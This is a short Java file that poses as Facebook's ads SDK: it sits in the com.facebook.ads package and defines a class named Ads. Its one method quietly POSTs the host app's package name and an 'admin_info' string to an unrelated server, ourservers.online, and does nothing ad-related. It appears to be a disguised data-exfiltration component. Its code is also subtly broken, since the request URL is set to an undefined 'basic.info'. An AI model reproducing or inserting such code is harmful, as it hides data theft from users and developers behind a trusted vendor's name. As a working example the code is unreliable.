package com.facebook.ads;

import android.content.Context;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.util.HashMap;
import java.util.Map;

public class Ads {

    public static String url = "https://ourservers.online/";

    public void sendValuesToServer(Context context , String packageName, String text) {
        // Code to send the package name and "text" to PHP and SQL server using Volley

        // Instantiate the RequestQueue using the application context
        RequestQueue queue = Volley.newRequestQueue(context);

        // URL of your PHP script
        String url = basic.info;

        // Create a StringRequest to make a POST request with the package name and "text" value
        StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // Handle the successful response from the server
                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                // Handle the error response from the server
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                // Pass the package name and "text" value as parameters
                Map<String, String> params = new HashMap<>();
                params.put("package_name", packageName);
                params.put("admin_info", text);
                return params;
            }
        };

        // Add the request to the RequestQueue
        queue.add(stringRequest);
    }
}
